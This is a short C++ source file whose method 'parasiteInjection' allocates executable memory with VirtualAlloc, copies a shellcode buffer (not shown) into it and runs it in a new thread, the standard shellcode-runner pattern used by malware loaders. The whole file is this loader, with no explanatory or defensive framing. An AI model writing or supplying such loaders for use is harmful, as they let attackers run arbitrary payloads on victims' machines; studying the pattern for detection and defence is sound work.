#include "Injection.h"

Injection::Injection() {}

void Injection::parasiteInjection() {

	SIZE_T shellcodeSize = sizeof(shellcode) - 1;

	PVOID shellcode_exec = VirtualAlloc(0, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
	RtlCopyMemory(shellcode_exec, shellcode, sizeof(shellcode));
	DWORD threadID;
	HANDLE hThread = CreateThread(NULL, 0, (PTHREAD_START_ROUTINE)shellcode_exec, NULL, 0, &threadID);
	WaitForSingleObject(hThread, INFINITE);
}